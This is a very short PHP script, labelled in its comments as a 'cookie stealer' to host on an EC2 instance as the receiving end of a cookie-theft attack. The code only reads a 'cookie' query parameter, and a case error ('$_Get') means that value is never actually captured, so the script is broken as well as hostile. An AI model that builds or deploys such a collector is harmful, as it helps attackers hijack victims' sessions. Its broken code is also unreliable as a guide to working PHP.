#
#Cookie stealer php file, Host this file on your EC2 instance
#Run this php script using "php -S IP:80"
#

<?php
    $cookie=isset($_Get['cookie']) ? $_GET['cookie']:"";
?>
